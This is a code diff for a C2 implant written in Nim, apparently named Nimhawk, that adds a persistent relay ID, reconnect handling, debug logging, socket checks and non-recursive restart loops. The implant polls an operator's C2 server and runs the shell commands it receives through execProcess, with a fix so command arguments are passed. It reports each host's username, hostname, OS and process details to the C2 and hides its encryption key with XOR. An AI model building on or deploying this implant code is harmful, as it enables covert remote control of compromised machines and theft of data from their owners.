@@ -63,6 +63,21 @@ var
 var g_relayClientID: string = ""
 var g_relayClientKey: string = ""
 
+# Global relay server ID (fixed, generated once)
+var g_relayServerID: string = ""
+
+# Generate fixed relay server ID
+proc getRelayServerID*(): string =
+    if g_relayServerID == "":
+        # Generate ONCE and reuse forever
+        let config = getRelayConfig()
+        randomize()
+        let randomPart = rand(1000..9999)
+        g_relayServerID = config.implantIDPrefix & "RELAY-SERVER-" & $randomPart
+        when defined debug:
+            echo "[DEBUG] 🆔 Generated FIXED relay server ID: " & g_relayServerID
+    return g_relayServerID
+
 # Speed optimization constants - CLIENT-SIDE CONFIGURATION
 when defined(FAST_MODE):
     const CLIENT_FAST_MODE* = true
@@ -283,16 +298,37 @@ proc connectToUpstreamRelay(host: string, port: int): string =
                 echo "[DEBUG] Successfully connected to upstream relay"
             
             # Send registration with complete system info
-            # CRITICAL: Check for existing ID first
-            var implantID = getStoredImplantID()
-            if implantID == "":
-                # No stored ID - send registration request to get ID from C2
-                implantID = "PENDING-REGISTRATION"
+            # CRITICAL: Preserve existing ID during reconnections (prevents ID amnesia)
+            var implantID: string
+            
+            # PRIORITY 1: Use in-memory ID if available (prevents ID amnesia during reconnects)
+            if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION":
+                implantID = g_relayClientID
                 when defined debug:
-                    echo "[DEBUG] No stored ID - sending registration to get ID from C2"
+                    echo "[DEBUG] 🧠 RECONNECT: Using IN-MEMORY relay client ID: " & implantID & " (prevents ID amnesia)"
+                
+                # CRITICAL: Ensure in-memory ID is also persisted to disk
+                let diskID = getStoredImplantID()
+                if diskID != implantID:
+                    storeImplantID(implantID)
+                    when defined debug:
+                        echo "[DEBUG] 💾 PERSIST: Re-saved in-memory ID to disk: " & implantID
+                else:
+                    when defined debug:
+                        echo "[DEBUG] ✅ PERSIST: ID already correctly stored on disk"
             else:
-                when defined debug:
-                    echo "[DEBUG] Using stored relay client ID: " & implantID
+                # PRIORITY 2: Use stored ID from disk (first run or memory cleared)
+                implantID = getStoredImplantID()
+                if implantID != "":
+                    when defined debug:
+                        echo "[DEBUG] 💾 FIRST RUN: Using STORED relay client ID: " & implantID
+                    # Store in memory for future reconnects
+                    g_relayClientID = implantID
+                else:
+                    # PRIORITY 3: New registration only if no ID exists anywhere
+                    implantID = "PENDING-REGISTRATION"
+                    when defined debug:
+                        echo "[DEBUG] 🆕 NEW CLIENT: No existing ID - requesting new registration from C2"
             
             # Store the ID globally for consistent use
             g_relayClientID = implantID
@@ -410,9 +446,19 @@ proc httpHandler() {.async.} =
         echo "[DEBUG] 🌐 HTTP Handler: Starting polling loop with " & $listener.sleepTime & "s interval"
     
     # MAIN POLLING LOOP - This is what was missing!
+    var httpCycleCount = 0
     while true:
         try:
+            httpCycleCount += 1
+            
             when defined debug:
+                echo ""
+                echo ""
+                echo ""
+                echo "┌─ 🌐 HTTP HANDLER CYCLE #" & $httpCycleCount
+                echo "├─ C2: " & listener.implantCallbackIp & ":" & listener.listenerPort & " │ Sleep: " & $listener.sleepTime & "s │ Relay: " & $g_relayServer.isListening
+                echo "└─────────────────────────────────────────────────────────"
+                echo ""
                 echo "[DEBUG] 🌐 HTTP Handler: Starting polling cycle"
             
             # 1. Handle relay registrations - forward to C2
@@ -439,7 +485,16 @@ proc httpHandler() {.async.} =
             
             if g_relayServer.isListening:
                 when defined debug:
+                    echo ""
+                    echo "┌─ 📡 RELAY SERVER POLLING CYCLE"
+                    let stats = relay_commands.getConnectionStats(g_relayServer)
+                    echo "├─ Port: " & $g_relayServer.port & " │ Connections: " & $stats.connections & " │ Fast: " & $g_serverFastMode
+                    echo "└─────────────────────────────────────────────────────────"
+                    echo ""
                     echo "[DEBUG] 🌐 HTTP Handler: Polling relay server for messages"
+                
+                # Declare messageCount outside try block for end-of-cycle logging
+                var messageCount = 0
                 
                 try:
                     let messages = pollRelayServerMessages()  # Use function from relay_commands.nim
@@ -449,6 +504,9 @@ proc httpHandler() {.async.} =
                         if messages.len > 0:
                             for i, msg in messages:
                                 echo "[DEBUG] 🌐 HTTP Handler: Message " & $i & " - Type: " & $msg.msgType & ", From: " & msg.fromID & ", Payload: " & $msg.payload.len & " bytes"
+                    
+                    # Capture message count for end-of-cycle logging
+                    messageCount = messages.len
                     
                     for msg in messages:
                         when defined debug:
@@ -484,11 +542,32 @@ proc httpHandler() {.async.} =
                                     timestamp: epochTime().int64
                                 )
                                 
-                                # Forward registration to C2 and get assigned ID and encryption key
-                                let (assignedId, encryptionKey) = webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
-                                                                          registration.localIP, registration.username, 
-                                                                          registration.hostname, registration.osInfo, 
-                                                                          registration.pid, registration.processName, true)
+                                # CHECK IF THIS IS A NEW REGISTRATION OR RE-REGISTRATION
+                                var assignedId: string
+                                var encryptionKey: string
+                                
+                                if registration.clientId == "PENDING-REGISTRATION":
+                                    # NEW REGISTRATION: Forward to C2 to get assigned ID and encryption key
+                                    when defined debug:
+                                        echo "[DEBUG] 🆕 HTTP Handler: NEW relay client registration - forwarding to C2"
+                                    
+                                    let (newId, newKey) = webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
+                                                                              registration.localIP, registration.username, 
+                                                                              registration.hostname, registration.osInfo, 
+                                                                              registration.pid, registration.processName, true)
+                                    assignedId = newId
+                                    encryptionKey = newKey
+                                    
+                                    when defined debug:
+                                        echo "[DEBUG] 🆕 HTTP Handler: C2 assigned new ID: " & assignedId
+                                else:
+                                    # RE-REGISTRATION: Client has existing ID, don't change it!
+                                    assignedId = registration.clientId  # Keep the existing ID
+                                    encryptionKey = ""  # Client will use its existing encryption key
+                                    
+                                    when defined debug:
+                                        echo "[DEBUG] 🔄 HTTP Handler: RE-REGISTRATION detected - keeping existing ID: " & assignedId
+                                        echo "[DEBUG] 🔄 HTTP Handler: NOT forwarding to C2, accepting existing client"
                                 
                                 # ADAPTIVE TIMING: Check if client is in fast mode and adapt server timing
                                 if regData.hasKey("fastMode") and regData["fastMode"].getBool():
@@ -514,16 +593,29 @@ proc httpHandler() {.async.} =
                                     echo "[DEBUG] 🌐 HTTP Handler: Original ID: " & registration.clientId
                                     echo "[DEBUG] 🔑 HTTP Handler: Got encryption key (length: " & $encryptionKey.len & ")"
                                 
-                                # Send assigned ID and encryption key back to relay client
-                                if assignedId != "" and encryptionKey != "":
-                                    # Create JSON with both ID and encryption key
-                                    let responseData = %*{
-                                        "id": assignedId,
-                                        "key": encryptionKey
-                                    }
+                                # Send response back to relay client
+                                if assignedId != "":
+                                    var responseData: JsonNode
+                                    
+                                    if encryptionKey != "":
+                                        # NEW REGISTRATION: Send both ID and encryption key
+                                        responseData = %*{
+                                            "id": assignedId,
+                                            "key": encryptionKey
+                                        }
+                                        when defined debug:
+                                            echo "[DEBUG] 🆕 HTTP Handler: Sending NEW ID and encryption key to client"
+                                    else:
+                                        # RE-REGISTRATION: Send confirmation with existing ID (no new key)
+                                        responseData = %*{
+                                            "id": assignedId,
+                                            "status": "reconnected"
+                                        }
+                                        when defined debug:
+                                            echo "[DEBUG] 🔄 HTTP Handler: Sending RE-REGISTRATION confirmation to client"
                                     
                                     let idMsg = createMessage(HTTP_RESPONSE,
-                                        generateImplantID("RELAY-SERVER"),
+                                        getRelayServerID(),
                                         @[registration.clientId, "RELAY-SERVER"],
                                         $responseData
                                     )
@@ -532,13 +624,13 @@ proc httpHandler() {.async.} =
                                     if stats.connections > 0:
                                         discard broadcastMessage(g_relayServer, idMsg)
                                         when defined debug:
-                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ ID and encryption key sent to relay client: " & assignedId
+                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Registration response sent to relay client: " & assignedId
                                     else:
                                         when defined debug:
                                             echo "[DEBUG] 🌐 HTTP Handler: ⚠️  No relay connections to send registration data to"
                                 else:
                                     when defined debug:
-                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ No ID or encryption key received from C2"
+                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ No valid ID for relay client registration"
                                 
                             except Exception as e:
                                 when defined debug:
@@ -647,7 +739,7 @@ proc httpHandler() {.async.} =
                                 
                                 # Create command message with JSON payload
                                 let cmdMsg = createMessage(COMMAND,
-                                    generateImplantID("RELAY-SERVER"),
+                                    getRelayServerID(),
                                     msg.route,
                                     $commandPayload
                                 )
@@ -668,7 +760,7 @@ proc httpHandler() {.async.} =
                                 
                                 # Send empty response to complete the PULL cycle
                                 let emptyResponse = createMessage(HTTP_RESPONSE,
-                                    generateImplantID("RELAY-SERVER"),
+                                    getRelayServerID(),
                                     msg.route,
                                     "NO_COMMANDS"
                                 )
@@ -759,7 +851,7 @@ proc httpHandler() {.async.} =
                             
                             # Send confirmation back to relay client
                             let confirmMsg = createMessage(HTTP_RESPONSE,
-                                generateImplantID("RELAY-SERVER"),
+                                getRelayServerID(),
                                 msg.route,
                                 "RESULT_SENT_TO_C2"
                             )
@@ -780,6 +872,14 @@ proc httpHandler() {.async.} =
                 except Exception as e:
                     when defined debug:
                         echo "[DEBUG] 🌐 HTTP Handler: Error polling relay server: " & e.msg
+                        
+                when defined debug:
+                    echo ""
+                    echo "┌─ 📡 END RELAY SERVER POLLING CYCLE"
+                    let finalStats = relay_commands.getConnectionStats(g_relayServer)
+                    echo "├─ Processed: " & $messageCount & " messages │ Active connections: " & $finalStats.connections
+                    echo "└─────────────────────────────────────────────────────────"
+                    echo ""
             
             # 2. Handle command results - send to C2
             for result in g_commandsToC2:
@@ -865,7 +965,13 @@ proc httpHandler() {.async.} =
             
             when defined debug:
                 echo "[DEBUG] 🌐 HTTP Handler: Woke up from sleep, continuing loop"
-            
+                echo ""
+                echo "┌─ 🌐 END HTTP HANDLER CYCLE"
+                echo "├─ 💤 Slept for " & $totalSleepMs & "ms - continuing loop"
+                echo "└─────────────────────────────────────────────────────────"
+                echo ""
+                echo ""
+                echo ""
         except Exception as e:
             when defined debug:
                 echo "[DEBUG] 🌐 HTTP Handler error: " & e.msg
@@ -883,9 +989,39 @@ proc relayClientHandler(host: string, port: int) {.async.} =
     while true:
         try:
             loopCount += 1
+            
             when defined debug:
-                echo "[DEBUG] 🔗 Relay Client: Loop #" & $loopCount & " - Polling upstream relay for messages..."
+                echo ""
+                echo "┌─ 🔗 RELAY CLIENT CYCLE #" & $loopCount
+                echo "├─ Host: " & host & ":" & $port & " │ Connected: " & $upstreamRelay.isConnected & " │ ID: " & g_relayClientID
+                echo "└─────────────────────────────────────────────────────────"
+                echo ""
+                echo "[DEBUG] 🔗 Relay Client: Polling upstream relay for messages..."
                 echo "[DEBUG] 🔗 Relay Client: Connection status: " & $upstreamRelay.isConnected
+            
+            # SOCKET HEALTH DIAGNOSTICS: Check if client socket is still valid
+            when defined debug:
+                try:
+                    let clientFd = upstreamRelay.socket.getFd()
+                    if clientFd == osInvalidSocket:
+                        echo "[DEBUG] 🚨 ┌─────────── SOCKET CORRUPTION DETECTED ───────────┐"
+                        echo "[DEBUG] 🚨 │ Client socket FD is INVALID! │"
+                        echo "[DEBUG] 🚨 │ This explains why send/recv fail │"
+                        echo "[DEBUG] 🚨 │ Socket was corrupted gradually │"
+                        echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
+                        upstreamRelay.isConnected = false
+                        await sleepAsync(ERROR_RECOVERY_SLEEP)
+                        continue
+                    else:
+                        echo "[DEBUG] 🔍 Socket health check - FD: " & $int(clientFd) & " (valid)"
+                except Exception as fdError:
+                    echo "[DEBUG] 🚨 ┌─────────── SOCKET FD ERROR ───────────┐"
+                    echo "[DEBUG] 🚨 │ Cannot check socket FD: " & fdError.msg & " │"
+                    echo "[DEBUG] 🚨 │ Socket is definitely corrupted │"
+                    echo "[DEBUG] 🚨 └─────────────────────────────────────────┘"
+                    upstreamRelay.isConnected = false
+                    await sleepAsync(ERROR_RECOVERY_SLEEP)
+                    continue
             
             let messages = pollUpstreamRelayMessages()  # Uses safe polling with timeout
             
@@ -962,30 +1098,51 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                     
                     when defined debug:
                         echo "[DEBUG] ⚡ Executing command: " & actualCommand
+                        if args.len > 0:
+                            echo "[DEBUG] ⚡ Command arguments: " & $args
                     
                     # For relay clients, we need to handle commands differently
                     # since we don't have an HTTP listener
                     var result: string
                     if actualCommand.startsWith("relay "):
+                        # RELAY COMMANDS: Process using relay command handler
+                        # Relay commands handle their own argument parsing
                         result = processRelayCommand(actualCommand)
                         when defined debug:
                             echo "[DEBUG] 🔧 Relay command executed"
                     else:
-                        # Execute system commands directly
+                        # SYSTEM COMMANDS: Combine command with arguments before execution
+                        var fullCommand = actualCommand
+                        
+                        # ✅ FIX: Properly combine command with arguments
+                        if args.len > 0:
+                            for arg in args:
+                                fullCommand = fullCommand & " " & arg
+                        
+                        when defined debug:
+                            echo "[DEBUG] 💻 ┌─────────── COMMAND EXECUTION ───────────┐"
+                            echo "[DEBUG] 💻 │ Base command: '" & actualCommand & "' │"
+                            echo "[DEBUG] 💻 │ Arguments: " & $args & " │"
+                            echo "[DEBUG] 💻 │ Full command: '" & fullCommand & "' │"
+                            echo "[DEBUG] 💻 └─────────────────────────────────────────┘"
+                        
+                        # Execute the complete command with arguments
                         try:
-                            result = execProcess(actualCommand)
+                            result = execProcess(fullCommand)
                             when defined debug:
                                 echo "[DEBUG] 💻 ┌─────────── COMMAND RESULT ───────────┐"
                                 echo "[DEBUG] 💻 │ ✅ System command executed successfully │"
+                                echo "[DEBUG] 💻 │ Full command: '" & fullCommand & "' │"
                                 echo "[DEBUG] 💻 │ Result length: " & $result.len & " bytes │"
                                 echo "[DEBUG] 💻 │ Result (first 200 chars): │"
                                 echo "[DEBUG] 💻 │ " & (if result.len > 200: result[0..199] & "..." else: result) & " │"
                                 echo "[DEBUG] 💻 └─────────────────────────────────────┘"
                         except Exception as e:
-                            result = "Error executing command: " & e.msg
+                            result = "Error executing command '" & fullCommand & "': " & e.msg
                             when defined debug:
                                 echo "[DEBUG] ❌ ┌─────────── COMMAND ERROR ───────────┐"
                                 echo "[DEBUG] ❌ │ Command execution failed │"
+                                echo "[DEBUG] ❌ │ Full command: '" & fullCommand & "' │"
                                 echo "[DEBUG] ❌ │ Error: " & e.msg & " │"
                                 echo "[DEBUG] ❌ └─────────────────────────────────────┘"
                     
@@ -1050,21 +1207,42 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                     elif responsePayload != "" and responsePayload != "PENDING-REGISTRATION" and not responsePayload.startsWith("RESULT_"):
                         # This could be an ID assignment (new JSON format) or old simple ID
                         try:
-                            # Try to parse as JSON (new format with ID + encryption key)
+                            # Try to parse as JSON 
                             let regResponse = parseJson(responsePayload)
                             let assignedId = regResponse["id"].getStr()
-                            let encryptionKey = regResponse["key"].getStr()
                             
-                            g_relayClientID = assignedId
-                            g_relayClientKey = encryptionKey
-                            storeImplantID(assignedId)
-                            
-                            when defined debug:
-                                echo "[DEBUG] 🆔 ┌─────────── ID & KEY ASSIGNMENT ───────────┐"
-                                echo "[DEBUG] 🆔 │ ✅ ID and encryption key assigned by C2 │"
-                                echo "[DEBUG] 🆔 │ New ID: " & assignedId & " │"
-                                echo "[DEBUG] 🔑 │ Key length: " & $encryptionKey.len & " │"
-                                echo "[DEBUG] 🆔 └─────────────────────────────────────────────┘"
+                            # Check if this is a new registration or re-registration
+                            if regResponse.hasKey("key"):
+                                # NEW REGISTRATION: Has encryption key
+                                let encryptionKey = regResponse["key"].getStr()
+                                g_relayClientID = assignedId
+                                g_relayClientKey = encryptionKey
+                                storeImplantID(assignedId)
+                                
+                                when defined debug:
+                                    echo "[DEBUG] 🆔 ┌─────────── NEW ID & KEY ASSIGNMENT ───────────┐"
+                                    echo "[DEBUG] 🆔 │ ✅ NEW ID and encryption key assigned by C2 │"
+                                    echo "[DEBUG] 🆔 │ New ID: " & assignedId & " │"
+                                    echo "[DEBUG] 🔑 │ Key length: " & $encryptionKey.len & " │"
+                                    echo "[DEBUG] 🆔 └─────────────────────────────────────────────────┘"
+                            elif regResponse.hasKey("status") and regResponse["status"].getStr() == "reconnected":
+                                # RE-REGISTRATION: Confirmed existing ID, keep current encryption key
+                                g_relayClientID = assignedId
+                                # g_relayClientKey stays the same - don't change it!
+                                # ID should already be stored, but confirm it
+                                storeImplantID(assignedId)
+                                
+                                when defined debug:
+                                    echo "[DEBUG] 🔄 ┌─────────── RE-REGISTRATION CONFIRMED ───────────┐"
+                                    echo "[DEBUG] 🔄 │ ✅ Existing ID confirmed by relay server │"
+                                    echo "[DEBUG] 🔄 │ ID: " & assignedId & " (PRESERVED) │"
+                                    echo "[DEBUG] 🔑 │ Encryption key: PRESERVED (no change) │"
+                                    echo "[DEBUG] 🔄 │ 🎉 Successfully reconnected with existing ID! │"
+                                    echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
+                            else:
+                                # Unknown format
+                                when defined debug:
+                                    echo "[DEBUG] ⚠️  Unknown registration response format"
                         except:
                             # Fallback to old format (plain ID)
                             g_relayClientID = responsePayload
@@ -1118,6 +1296,26 @@ proc relayClientHandler(host: string, port: int) {.async.} =
             # Record start time for network latency measurement
             let pullStartTime = epochTime()
             
+            # SOCKET HEALTH BEFORE SEND: Critical diagnostic point
+            when defined debug:
+                try:
+                    let preSendFd = upstreamRelay.socket.getFd()
+                    if preSendFd == osInvalidSocket:
+                        echo "[DEBUG] 🚨 ┌─────────── PRE-SEND SOCKET CORRUPTION ───────────┐"
+                        echo "[DEBUG] 🚨 │ Socket FD corrupted BEFORE sending PULL │"
+                        echo "[DEBUG] 🚨 │ This will definitely cause send to fail │"
+                        echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
+                        upstreamRelay.isConnected = false
+                        await sleepAsync(ERROR_RECOVERY_SLEEP)
+                        continue
+                    else:
+                        echo "[DEBUG] 🔍 Pre-send socket health - FD: " & $int(preSendFd) & " (sending PULL now...)"
+                except Exception as preSendError:
+                    echo "[DEBUG] 🚨 Pre-send socket check failed: " & preSendError.msg
+                    upstreamRelay.isConnected = false
+                    await sleepAsync(ERROR_RECOVERY_SLEEP)
+                    continue
+            
             # Encrypt the relay client's encryption key for secure transmission
             let encryptedKey = xorString(g_relayClientKey, INITIAL_XOR_KEY)
             
@@ -1150,10 +1348,23 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 # Send failed - connection is definitely dead
                 updateNetworkHealth(pullStartTime, false)
                 
+                # POST-SEND SOCKET DIAGNOSTICS: Check what happened to socket after send failed
                 when defined debug:
                     echo "[DEBUG] ❌ ┌─────────── PULL FAILED ───────────┐"
                     echo "[DEBUG] ❌ │ Failed to send PULL request │"
-                    echo "[DEBUG] ❌ │ Connection is dead │"
+                    
+                    try:
+                        let postSendFd = upstreamRelay.socket.getFd()
+                        if postSendFd == osInvalidSocket:
+                            echo "[DEBUG] ❌ │ Socket FD corrupted DURING send! │"
+                            echo "[DEBUG] ❌ │ Send operation corrupted the socket │"
+                        else:
+                            echo "[DEBUG] ❌ │ Socket FD still valid: " & $int(postSendFd) & " │"
+                            echo "[DEBUG] ❌ │ Send failed for other reason │"
+                    except Exception as postSendError:
+                        echo "[DEBUG] ❌ │ Cannot check post-send FD: " & postSendError.msg & " │"
+                    
+                    echo "[DEBUG] ❌ │ Connection marked as dead │"
                     echo "[DEBUG] ❌ └─────────────────────────────────┘"
                 
                 # Force disconnect
@@ -1163,8 +1374,16 @@ proc relayClientHandler(host: string, port: int) {.async.} =
             let adaptiveInterval = getAdaptivePollingInterval()
             
             when defined debug:
+                echo ""
                 echo "[DEBUG] 🌐 Adaptive sleep: " & $adaptiveInterval & "ms (base: " & 
                      (if CLIENT_FAST_MODE: "1000ms" else: "2000ms") & ", RTT: " & $g_networkHealth.rtt.int & "ms)"
+                echo ""
+                echo "┌─ 🔗 END RELAY CLIENT CYCLE #" & $loopCount
+                echo "├─ 💤 Sleeping for " & $adaptiveInterval & "ms..."
+                echo "└─────────────────────────────────────────────────────────"
+                echo ""
+                echo ""
+                echo ""
             
             await sleepAsync(adaptiveInterval)
             
@@ -1200,37 +1419,56 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 echo "[DEBUG] Relay client error: " & e.msg
             await sleepAsync(ERROR_RECOVERY_SLEEP) # Optimized error recovery sleep
 
-# Safe async wrappers to prevent event loop crashes
+# Safe async wrappers to prevent event loop crashes - FIXED ASYNC RECURSION CASCADE
+var g_relayClientRunning = false
+var g_httpHandlerRunning = false
+
 proc safeRelayClientHandler(host: string, port: int) {.async.} =
+    if g_relayClientRunning:
+        when defined debug:
+            echo "[SAFETY] 🛡️  Relay client already running, ignoring duplicate start"
+        return
+    
+    g_relayClientRunning = true
     try:
         await relayClientHandler(host, port)
     except Exception as e:
         when defined debug:
             echo "[CRITICAL] 🚨 Relay client handler crashed: " & e.msg
             echo "[CRITICAL] 🚨 Stack trace: " & e.getStackTrace()
-        # Attempt recovery after delay
+        # Attempt recovery after delay - NO RECURSION
         await sleepAsync(5000)  # 5 second recovery delay
         when defined debug:
-            echo "[RECOVERY] 🔄 Attempting to restart relay client handler"
-        # Recursive restart (with built-in exception handling)
-        asyncCheck safeRelayClientHandler(host, port)
+            echo "[RECOVERY] 🔄 Relay client will restart in main loop - NO RECURSION"
+    finally:
+        g_relayClientRunning = false
+        when defined debug:
+            echo "[CLEANUP] 🧹 Relay client handler stopped, flag reset"
 
 proc safeHttpHandler() {.async.} =
+    if g_httpHandlerRunning:
+        when defined debug:
+            echo "[SAFETY] 🛡️  HTTP handler already running, ignoring duplicate start"
+        return
+    
+    g_httpHandlerRunning = true
     try:
         await httpHandler()
     except Exception as e:
         when defined debug:
             echo "[CRITICAL] 🚨 HTTP handler crashed: " & e.msg
             echo "[CRITICAL] 🚨 Stack trace: " & e.getStackTrace()
-        # Attempt recovery after delay
+        # Attempt recovery after delay - NO RECURSION
         await sleepAsync(5000)  # 5 second recovery delay
         when defined debug:
-            echo "[RECOVERY] 🔄 Attempting to restart HTTP handler"
-        # Recursive restart (with built-in exception handling)
-        asyncCheck safeHttpHandler()
+            echo "[RECOVERY] 🔄 HTTP handler will restart in main loop - NO RECURSION"
+    finally:
+        g_httpHandlerRunning = false
+        when defined debug:
+            echo "[CLEANUP] 🧹 HTTP handler stopped, flag reset"
 
 # Main execution function
-proc runMultiImplant*() =
+proc runMultiImplant*() {.async.} =
     echo "=== Nimhawk Multi-Platform v1.5.0 - Dynamic Relay System ==="
     
     when defined debug:
@@ -1290,11 +1528,22 @@ proc runMultiImplant*() =
                                 echo "[DEBUG] 🔗 RELAY CLIENT MODE ACTIVATED"
                                 echo "[DEBUG] 📡 Listening for commands from relay server..."
                             
-                            # Relay client main loop - only handle relay messages using SAFE FUNCTIONS
-                            asyncCheck safeRelayClientHandler(host, port)
-                            
-                            # Run the async event loop
-                            runForever()
+                            # Relay client main loop with safe restart mechanism
+                            while true:
+                                try:
+                                    when defined debug:
+                                        echo "[MAIN] 🚀 Starting relay client handler (safe mode)"
+                                    
+                                    await safeRelayClientHandler(host, port)
+                                    
+                                    when defined debug:
+                                        echo "[MAIN] 🔄 Relay client handler ended, restarting in 5 seconds..."
+                                    
+                                    await sleepAsync(5000)  # Wait before restart
+                                except Exception as e:
+                                    when defined debug:
+                                        echo "[MAIN] 💥 Critical error in main relay loop: " & e.msg
+                                    await sleepAsync(10000)  # Longer wait on critical error
                         else:
                             when defined debug:
                                 echo "[DEBUG] Failed to connect to relay. Exiting."
@@ -1324,15 +1573,27 @@ proc runMultiImplant*() =
             echo "[DEBUG] 🚀 Starting HTTP Handler..."
             echo "[DEBUG] ℹ️  Relay server will start when 'relay port' command is executed"
         
-        # Start only HTTP handler - relay server starts via command
-        asyncCheck safeHttpHandler()
-        
+        # Start HTTP handler with safe restart mechanism
         when defined debug:
-            echo "[DEBUG] ✅ HTTP handler started"
-            echo "[DEBUG] 🔄 Running async event loop..."
+            echo "[DEBUG] ✅ Starting HTTP handler with safe restart"
+            echo "[DEBUG] 🔄 Running main loop..."
         
-        # Run the async event loop forever
-        runForever()
+        # Safe main loop for HTTP handler
+        while true:
+            try:
+                when defined debug:
+                    echo "[MAIN] 🚀 Starting HTTP handler (safe mode)"
+                
+                await safeHttpHandler()
+                
+                when defined debug:
+                    echo "[MAIN] 🔄 HTTP handler ended, restarting in 5 seconds..."
+                
+                await sleepAsync(5000)  # Wait before restart
+            except Exception as e:
+                when defined debug:
+                    echo "[MAIN] 💥 Critical error in main HTTP loop: " & e.msg
+                await sleepAsync(10000)  # Longer wait on critical error
 
 # Entry point
 when isMainModule:
@@ -1359,4 +1620,4 @@ when isMainModule:
         echo "[DEBUG] Server adaptive mode: " & (if g_serverFastMode: "FAST (1s)" else: "NORMAL (2s)")
     
     randomize()
-    runMultiImplant() 
+    waitFor runMultiImplant() 
